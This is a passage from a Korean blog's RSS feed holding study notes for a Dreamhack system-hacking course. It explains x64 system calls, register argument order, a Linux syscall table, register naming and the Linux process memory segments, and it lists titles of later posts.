    &lt;li&gt;Q. 그럼 프로세스에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec echo HOSTNAME&lt;/code&gt; 을 실행할 때 프로세스는 커널 모드로 진입하게 되는 건가요?&lt;/li&gt;
    &lt;li&gt;A. 아닙니다. OS의 구성요소가 아닌 유저 레벨에서 생성되고 관리되는 요소들이라면 무조건 유저 모드에서 벗어날 수 없습니다. 해당 프로세스는 커널 권한이 필요한 행위를 수행하고 싶을 때 &lt;strong&gt;OS에게 수행을 요청&lt;/strong&gt;하고 그 결과만 받아보게 됩니다. 즉 OS가 커널 모드로 진입하고 빠져나옵니다.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;즉, OS를 침해하는 해킹이 가장 심각한 결과를 이끌어내는 경우는 해당 해킹이 OS의 커널 모드 권한을 빼앗았을 때 발생한다.&lt;/p&gt;

&lt;p&gt;그렇다면 시스템 콜(System Call)이란 무엇일까? 위에 서술한 내용 중에 답이 있다… (소곤소곤)&lt;/p&gt;

&lt;p&gt;굵은 글씨로 쓰인 내용을 보자. 그리고 다음 설명을 보자. System Call이란 유저 모드에서 커널 모드에서의 수행이 필요할 때 ‘요청하는 것’이다. 이해가 확 될 것이다.&lt;/p&gt;

&lt;p&gt;정리해서,&lt;/p&gt;

&lt;aside&gt;
⚙ 유저 모드의 프로세스에서 커널 모드의 동작이 필요하다. → System Call을 한다. → OS는 해당 요청을 승인해 커널 모드의 동작을 수행한다. → OS는 수행 결과를 반환한다. → 프로세스는 반환받은 결과를 이용한다.

&lt;/aside&gt;

&lt;p&gt;x64 아키텍처에서는 시스템콜을 하기 위해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; 명령어를 쓴다. &lt;del&gt;나도 프로그래밍 하다가 본 것 같다… 아마도?&lt;/del&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;여기에서 끝나면 안된다. 지금 이 포스트의 목적은 ‘어셈블리어’를 공부하는 것이지 OS 개론을 공부하는 게 아니기 때문이다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; 명령어로 사용할 수 있는 시스템 콜은 함수다. 즉, 인자가 있고, 해당 인자를 이용해 어떠한 행위를 한다. 이 경우에는 커널에게 ‘사전 정보’를 주면서 ‘원하는 행위’를 요청하는 것임을 추측할 수 있다.&lt;/p&gt;

&lt;p&gt;이렇게 원하는 행위와 사전 정보를 전달할 때, 아키텍처 레벨로 내려가 본다면 당연히 레지스터가 개입할 것이다. 파라미터가 있는 펑션콜이 수행되는 과정을 한 번 어셈블리 디버거로 보게 되면 직관적으로 알 수 있다. 그렇다면 어떤 레지스터가 통상적으로 개입할까? 그리고 어떤 레지스터에 ‘사전 정보’와 ‘원하는 행위’가 들어갈까?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;리눅스의 경우 ‘원하는 행위’를 가리키는 데이터는 rax에 저장된다.&lt;/strong&gt; 해당 값은 시스템 콜 테이블이라는 시스템 콜이 저장되어 있는 테이블의 인덱스 넘버이므로, 어떠한 행위를 원하는지를 시스템이 인식할 수 있다.&lt;/p&gt;

&lt;p&gt;어떤 행위를 원하는지 알았다면 그 행위에 필요한 인자를 받아야 할 차례다. 한 예로, 현재 메모리에 있는 값을 읽어 와 콘솔에 write하려 한다고 하자. (write가 핵심이다. 프로세스가 선언한 데이터가 저장되어 있는 영역을 read할 땐 유저 권한으로 한다. 애초에 메모리에는 커널만을 위한 영역이 따로 있어서 엄격하게 커널과 유저 권한을 분리한다)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;write를 하기 위해서는 ‘어디에’ ‘무엇을’ ‘얼마만큼의 길이로’ 쓸 것인지를 알려 줘야 한다.&lt;/strong&gt; 그리고 OS는 정확하게 이 세 가지 요건을 입력받아 write 연산에 사용한다. 각 정보는 rdi, rsi, rdx에 저장된다. 레지스터의 용도를 고려해 보면 일리가 있게 저장되는 셈이다.&lt;/p&gt;

&lt;p&gt;rdi는 destination, 즉 정보가 어디로 향할지를 저장하는 데 쓰이고, rsi는 source, 즉 정보의 출처가 어디인지 지정하는 데 쓰이므로 각각 ‘어디에’와 ‘무엇을’ 을 저장하는 데 적합한 논리를 가지고 있기 때문이다.&lt;/p&gt;

&lt;p&gt;그렇다면 ‘얼마만큼의 길이로’를 저장하는 rdx는? 이건 사실 일반적인 convention 때문에 쓰인다. 그 convention이란 무엇이냐면…&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;rdi&lt;/td&gt;
      &lt;td&gt;첫 번째 인자 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rsi&lt;/td&gt;
      &lt;td&gt;두번째 인자 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rdx&lt;/td&gt;
      &lt;td&gt;세번째 인자 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rcx&lt;/td&gt;
      &lt;td&gt;네번째 인자 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;r8&lt;/td&gt;
      &lt;td&gt;다섯번째 인자 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;r9&lt;/td&gt;
      &lt;td&gt;여섯번째 인자 저장&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;바로 위의 테이블이다. 일반적으로 함수의 파라미터를 전달할 때 레지스터는 위와 같은 순서로 인자를 저장한다.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;그런데 좀 이상하네… 지금 이걸 쓰면서 생긴 의문인데, 이런 convention은 system call에 인자를 전달하면서 생겨나서 유저 권한의 함수를 콜할 때도 쓰게 된 거 아닌가? 그럼 system call에 rdx를 세번째 인자를 전달할 때 쓰는 이유는 대체 왜지? 언젠가 알게 되겠지… 지금은 이게 핵심이 아니니까 넘어가자.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;정리해 보자. 만일 콘솔에 메모리 상의 어떤 정보를 읽어와 write한다고 치면&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; 명령어가 실행된다. 이렇게 syscall 명령어가 실행되면 &lt;strong&gt;CPU는 rax부터 쳐다보게 된다.&lt;/strong&gt; &lt;del&gt;(언니 뭐부터 할까요)&lt;/del&gt; 그렇게 어떤 시스템 콜을 실행할지 결정하면 CPU는 해당 시스템 콜에 사용할 인자를 확인하기 위해 아래의 순서로 레지스터를 참조한다.(유저 권한에서 시스템 콜을 요청할 때는 아래의 sequence로 진행되고, 커널 권한의 인터페이스에서 뭔가를 할 땐 또 다른 sequence로 레지스터를 읽는다)&lt;/p&gt;

&lt;aside&gt;
⚙ **rdi → rsi → rdx → rcx → r8 → r9 → stack**

&lt;/aside&gt;

&lt;p&gt;rax에서 write system call을 가리키고 있기 때문에, 이제 커널은 write(out_mode, data_add, length)를 수행하게 된다. 인자가 3개이므로 커널이 참조하는 레지스터는 rdi, rsi, rdx가 된다.&lt;/p&gt;

&lt;p&gt;참고로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; 이 리턴되면 레지스터 컨벤션에 따라 rax에 시스템 콜의 결과가 저장된다. 에러 번호라든가 성공 여부라든가…&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;부록: System call table 중 주요 몇 가지 시스템 콜(검색하면 나옴)&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;syscall&lt;/th&gt;
          &lt;th&gt;rax&lt;/th&gt;
          &lt;th&gt;arg0 (rdi)&lt;/th&gt;
          &lt;th&gt;arg1 (rsi)&lt;/th&gt;
          &lt;th&gt;arg2 (rdx)&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;read&lt;/td&gt;
          &lt;td&gt;0x00&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt;char *buf&lt;/td&gt;
          &lt;td&gt;size_t count&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;write&lt;/td&gt;
          &lt;td&gt;0x01&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt;const char *buf&lt;/td&gt;
          &lt;td&gt;size_t count&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;open&lt;/td&gt;
          &lt;td&gt;0x02&lt;/td&gt;
          &lt;td&gt;const char *filename&lt;/td&gt;
          &lt;td&gt;int flags&lt;/td&gt;
          &lt;td&gt;umode_t mode&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;close&lt;/td&gt;
          &lt;td&gt;0x03&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt; &lt;/td&gt;
          &lt;td&gt; &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;mprotect&lt;/td&gt;
          &lt;td&gt;0x0a&lt;/td&gt;
          &lt;td&gt;unsigned long start&lt;/td&gt;
          &lt;td&gt;size_t len&lt;/td&gt;
          &lt;td&gt;unsigned long prot&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;connect&lt;/td&gt;
          &lt;td&gt;0x2a&lt;/td&gt;
          &lt;td&gt;int sockfd&lt;/td&gt;
          &lt;td&gt;struct sockaddr * addr&lt;/td&gt;
          &lt;td&gt;int addrlen&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;execve&lt;/td&gt;
          &lt;td&gt;0x3b&lt;/td&gt;
          &lt;td&gt;const char *filename&lt;/td&gt;
          &lt;td&gt;const char *const *argv&lt;/td&gt;
          &lt;td&gt;const char *const *envp&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Tue, 28 Jun 2022 04:25:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/dreamhack_system_hacking/step2-2</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/dreamhack_system_hacking/step2-2</guid>
      </item>
    
      <item>
        <title>System Hackig Step 2</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#stage-2&quot; id=&quot;markdown-toc-stage-2&quot;&gt;STAGE 2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#background-computer-architecture&quot; id=&quot;markdown-toc-background-computer-architecture&quot;&gt;Background: Computer Architecture&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#x86-64-architectureamd64-architecture&quot; id=&quot;markdown-toc-x86-64-architectureamd64-architecture&quot;&gt;X86-64 Architecture=AMD64 Architecture&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#x64-아키텍쳐의-레지스터&quot; id=&quot;markdown-toc-x64-아키텍쳐의-레지스터&quot;&gt;x64 아키텍쳐의 레지스터&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#레지스터-호환&quot; id=&quot;markdown-toc-레지스터-호환&quot;&gt;레지스터 호환&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#background-linux-memory-layout&quot; id=&quot;markdown-toc-background-linux-memory-layout&quot;&gt;Background: Linux Memory Layout&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#리눅스-프로세스의-메모리-구조&quot; id=&quot;markdown-toc-리눅스-프로세스의-메모리-구조&quot;&gt;리눅스 프로세스의 메모리 구조&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#5개-segment&quot; id=&quot;markdown-toc-5개-segment&quot;&gt;“5개 Segment”&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#code-segment&quot; id=&quot;markdown-toc-code-segment&quot;&gt;“Code Segment”&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#data-segment&quot; id=&quot;markdown-toc-data-segment&quot;&gt;“Data Segment”&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#bss-segment&quot; id=&quot;markdown-toc-bss-segment&quot;&gt;“BSS Segment”&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#stack-segment&quot; id=&quot;markdown-toc-stack-segment&quot;&gt;“Stack Segment”&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#heap-segment&quot; id=&quot;markdown-toc-heap-segment&quot;&gt;“Heap Segment”&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;stage-2&quot;&gt;STAGE 2&lt;/h1&gt;

&lt;h1 id=&quot;background-computer-architecture&quot;&gt;Background: Computer Architecture&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Instruction Set Architecture: CPU가 사용하는 명령어와 관련된 설계. CPU가 해석하는 명령어의 집합.
    &lt;ul&gt;
      &lt;li&gt;가장 널리 사용되는 ISA: Intel x86-64, ARM&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;x86-64-architectureamd64-architecture&quot;&gt;X86-64 Architecture=AMD64 Architecture&lt;/h2&gt;

&lt;h3 id=&quot;x64-아키텍쳐의-레지스터&quot;&gt;x64 아키텍쳐의 레지스터&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;General Register
    &lt;ul&gt;
      &lt;li&gt;주용도는 있지만, 그 외의 다양한 용도로 사용될 수 있는 레지스터.
        &lt;ul&gt;
          &lt;li&gt;32비트 아키텍쳐 CPU가 제공할 수 있는 가상메모리의 크기: 4GB&lt;/li&gt;
          &lt;li&gt;64비트 아키텍쳐 CPU가 제공할 수 있는 가상메모리의 크기: 16EB(엑사바이트)-어마어마하게 큰 공간으로, 프로세스의 성능에 제한을 걸 일이 없다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;x64의 경우 각 범용 레지스터에는 8바이트 저장&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;이름이 r로 시작함-64비트 아키텍쳐. 32비트 아키텍쳐는 e로 시작함.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/systemHackingStep2.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;x64의 general register중 주용도가 정해진 레지스터들.&lt;/p&gt;

        &lt;p&gt;→ ebx는 rbx와는 다르게 메모리 주소를 저장하기 위한 용도로 사용됐었음.&lt;/p&gt;

        &lt;p&gt;→ edx는 rdx와는 다르게 부호 관련한 명령을 저장하기 위한 용도로 사용됐었음.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Segment Register
    &lt;ul&gt;
      &lt;li&gt;6개 종류: cs, ss, ds, es, fs, gs&lt;/li&gt;
      &lt;li&gt;64비트로 아키텍처 확장되면서 용도에 큰 변화가 생김.
        &lt;ul&gt;
          &lt;li&gt;32비트 시절… general register 크기가 작으니 사용 가능한 메모리 주소 폭도 좁았음.&lt;/li&gt;
          &lt;li&gt;따라서 오프셋에 필요한 세그먼트 주소를 저장해 주기 위해 사용됐었음.=사용 가능한 메모리 주소 폭을 늘려 줬음.
            &lt;ul&gt;
              &lt;li&gt;실제 주소 = 오프셋 주소 + 세그먼트 주소&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;그런데 64비트 구조가 되면서 사용 가능한 메모리 주소 폭이 매우 넓어짐.&lt;/li&gt;
          &lt;li&gt;따라서, 이젠 주소를 간접적으로 표현해 주기 위해 사용하는 일이 없어짐.&lt;/li&gt;
          &lt;li&gt;x64에서 cs, ds, ss는 코드 영역, 데이터, 스택 메모리 영역을 가리킬 때 사용됨.&lt;/li&gt;
          &lt;li&gt;나머지 레지스터는 운영체제 별로 용도를 결정할 수 있도록 범용적으로 제작되었음.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Instruction Pointer Register
    &lt;ul&gt;
      &lt;li&gt;다음에 실행할 instruction 가리키기.&lt;/li&gt;
      &lt;li&gt;x64: rip(8 byte), x86-64: eip(4 byte)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Flag Register
    &lt;ul&gt;
      &lt;li&gt;프로세서의 현재 상태를 저장하고 있는 레지스터.&lt;/li&gt;
      &lt;li&gt;x86: 16 bit → x64: 64 bit, “RFLAGS”&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;RFLAGS는 64개의 플래그를 사용할 수 있지만, 실질적으로는 오른쪽 20개 정도 비트만 사용.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/systemHackingStep2_1.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;시스템 해킹을 할 때 주로 접할 플래그&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;레지스터-호환&quot;&gt;레지스터 호환&lt;/h3&gt;

&lt;p&gt;16비트 아키텍처: 앞에 아무것도 안 붙음&lt;/p&gt;

&lt;p&gt;32비트 아키텍처: 앞에 e 붙음&lt;/p&gt;

&lt;p&gt;64비트 아키텍처: 앞에 r 붙음&lt;/p&gt;

&lt;p&gt;예시: ax(eax의 하위 16비트) &amp;lt; eax(rax의 하위 32비트) &amp;lt; rax&lt;/p&gt;

&lt;p&gt;그 와중에 16비트 아키텍처의 레지스터는 eax의 상위 8비트, 하위 8비트를 차지하는 것도 있음. (AX, BX, CX, DX 계열 중 끝이 H면 High로 상위 8비트, L면 Low로 하위 8비트)&lt;/p&gt;

&lt;h1 id=&quot;background-linux-memory-layout&quot;&gt;Background: Linux Memory Layout&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Memory Corruption: 공격자가 악의적으로 조작한 메모리 값에 의해 CPU가 잘못된 동작을 하게 되는 공격. 시스템 해킹의 공격 기법의 기본이 되는 기법.&lt;/li&gt;
  &lt;li&gt;Memory Corruption을 이용한 취약점의 종류:
    &lt;ul&gt;
      &lt;li&gt;Stack Buffer Overflow&lt;/li&gt;
      &lt;li&gt;Off by One&lt;/li&gt;
      &lt;li&gt;Format String Bug&lt;/li&gt;
      &lt;li&gt;Double Free Bug&lt;/li&gt;
      &lt;li&gt;Use After Free&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;리눅스-프로세스의-메모리-구조&quot;&gt;리눅스 프로세스의 메모리 구조&lt;/h2&gt;

&lt;h3 id=&quot;5개-segment&quot;&gt;“5개 Segment”&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;적재되는 데이터 용도별로 메모리의 구획을 나눈 것.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;리눅스에서 프로세스의 메모리를 구분하는 방식.&lt;/li&gt;
    &lt;li&gt;1) 코드 세그먼트, 2) 데이터 세그먼트, 3) BSS 세그먼트, 4) 힙 세그먼트, 5) 스택 세그먼트&lt;/li&gt;
    &lt;li&gt;구획별로 권한이 다르고, CPU는 해당 구역에 부여된 권한에 맞는 행위만 할 수 있음.
      &lt;ul&gt;
        &lt;li&gt;READ&lt;/li&gt;
        &lt;li&gt;WRITE&lt;/li&gt;
        &lt;li&gt;EXECUTE&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;더 자세히 알고 싶다면, 세그먼테이션 기법 &amp;amp;&amp;amp; x86-64 하드웨어 설계 참고.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/systemHackingStep2_2.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;우와~ 리눅스에서는 실행 중인 프로세스의 메모리가 5개의 영역으로 구분되고, 각 영역별로 CPU가 부여받은 권한이 다르구나!&lt;/p&gt;

&lt;h3 id=&quot;code-segment&quot;&gt;“Code Segment”&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;실행 가능한 기계 코드가 위치하는 영역&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;READ &amp;amp; EXECUTE: CPU가 코드를 “읽어서” “실행”해야 하므로.&lt;/li&gt;
    &lt;li&gt;WRITE 권한이 절대 있으면 안되는 영역: 악의적인 코드를 “쓰면” 안 되니까.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;data-segment&quot;&gt;“Data Segment”&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;컴파일 시점에 값이 정해진 전역 변수 &amp;amp; 전역 상수가 위치하는 영역.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;Initialized Global&lt;/li&gt;
    &lt;li&gt;READ + (상황에 따라 WRITE)&lt;/li&gt;
    &lt;li&gt;데이터 세그먼트에는 두 종류가 있음.
      &lt;ul&gt;
        &lt;li&gt;Data Segment
          &lt;ul&gt;
            &lt;li&gt;WRITABLE: 프로그램이 실행되면서 값이 변할 수 있는 데이터들. 예) 글로벌 “변수” 등…&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
        &lt;li&gt;ROData Segment: Read-Only
          &lt;ul&gt;
            &lt;li&gt;Non-WRITABLE: 프로그램이 실행되면서 값이 변하면 안 되는 데이터들. 예) 글로벌 “상수”&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;bss-segment&quot;&gt;“BSS Segment”&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;컴파일 시점에 값이 정해지지 않은 전역 변수가 위치하는 영역.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;Block Started by Symbol Segment&lt;/li&gt;
    &lt;li&gt;Not Initialized Global; 선언만 하고 초기화는 안한 전역 변수들&lt;/li&gt;
    &lt;li&gt;프로그램 시작 시 모두 0으로 값이 초기화됨.&lt;/li&gt;
    &lt;li&gt;READ + WRITE&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;stack-segment&quot;&gt;“Stack Segment”&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;프로세스의 스택이 위치하는 영역. 함수의 인자, 지역 변수 등의 임시 변수들이 ‘프로세스 실행 중’에 저장되는 공간.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;READ + WRITE&lt;/li&gt;
    &lt;li&gt;“스택 프레임(Stack Frame)”이라는 단위로 사용됨.
      &lt;ul&gt;
        &lt;li&gt;함수가 호출될 때 생성되고, 반환될 때 해제됨(우리가 익히 아는 그것)&lt;/li&gt;
        &lt;li&gt;프로그램의 코드 플로우를 정확히 예측하는 건 불가능하므로, 스택도 가변적으로 할당됨.
          &lt;ul&gt;
            &lt;li&gt;작은 크기의 스택 세그먼트를 먼저 할당해 주고, 부족해지면 확장.&lt;/li&gt;
            &lt;li&gt;“아래로 자란다”: 높은 주소→낮은 주소로 확장.&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;heap-segment&quot;&gt;“Heap Segment”&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;힙 데이터가 위치하는 세그먼트. 메모리 할당 시 할당된 메모리가 저장된다.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;READ + WRITE&lt;/li&gt;
    &lt;li&gt;스택과 동일하게 실행중에 동적으로 할당된다.&lt;/li&gt;
    &lt;li&gt;리눅스에서는 스택 세그먼트와 반대 방향으로 자란다: 낮은 주소 → 높은 주소로 확장.&lt;/li&gt;
    &lt;li&gt;할당된 메모리가 저장된다: C언의 경우 malloc(), calloc()등으로 할당받은 메모리가 저장된다.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;Q. 힙과 스택 세그먼트가 자라는 방향이 반대인 이유?&lt;/p&gt;

&lt;p&gt;A. 동일하면 충돌하니까. 따라서 리눅스는 스택 베이스를 메모리 끝에 위치시키고 힙 베이스는 낮은 주소에 위치시켜서 충돌할 일이 거의 없게 만들어 놨음.&lt;/p&gt;
</description>
        <pubDate>Wed, 22 Jun 2022 22:24:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/dreamhack_system_hacking/step2-1</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/dreamhack_system_hacking/step2-1</guid>
      </item>
    

    
      
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
      
        
          <item>
            <title>About</title>
            <description>&lt;p&gt;This is the base Jekyll theme. You can find out more info about customizing your Jekyll theme, as well as basic Jekyll usage documentation at &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;jekyllrb.com&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can find the source code for Minima at GitHub:
&lt;a href=&quot;https://github.com/jekyll&quot;&gt;jekyll&lt;/a&gt; /
&lt;a href=&quot;https://github.com/jekyll/minima&quot;&gt;minima&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can find the source code for Jekyll at GitHub:
&lt;a href=&quot;https://github.com/jekyll&quot;&gt;jekyll&lt;/a&gt; /
&lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;jekyll&lt;/a&gt;&lt;/p&gt;

</description>
            <link>https://touBVa.github.io/about/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title></title>
            <description>&lt;h3&gt;   &lt;/h3&gt;

&lt;div id=&quot;categories&quot;&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#dreamhack_system_hacking&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/dreamhack_system_hacking&quot;&gt;dreamhack_system_hacking&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;dreamhack_system_hacking&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step6/ssp_001&quot;&gt;System Hacking Step 6: ssp_001&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step6-1&quot;&gt;System Hacking Step 6-1&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step5-basic_exploitation_000&quot;&gt;Wargame: Basic_Exploitation_000&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step5-3&quot;&gt;System Hackig Step 5-3&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step5-2&quot;&gt;System Hackig Step 5-2&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step5-1&quot;&gt;System Hackig Step 5&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step4-2&quot;&gt;System Hackig Step 4-2: Shell_basic&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step4-1&quot;&gt;System Hackig Step 4&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step3-2&quot;&gt;System Hackig Step 3-2&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step3-1&quot;&gt;System Hackig Step 3-1&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
